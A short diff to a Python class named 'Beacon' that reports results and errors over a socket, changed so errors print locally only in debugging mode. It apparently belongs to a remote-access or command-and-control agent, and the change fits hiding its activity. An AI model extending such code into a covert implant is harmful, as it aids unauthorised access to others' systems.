@@ -28,7 +28,8 @@ class Beacon:
             self.sock.send("SUCCESS")
       except Exception as e:
                      error_msg = f"ERROR: {str(e)}"
-                     print(error_msg)
+                     if self.debugging == True:
+                        print(error_msg)
                      self.sock.send(error_msg.encode())
 
 
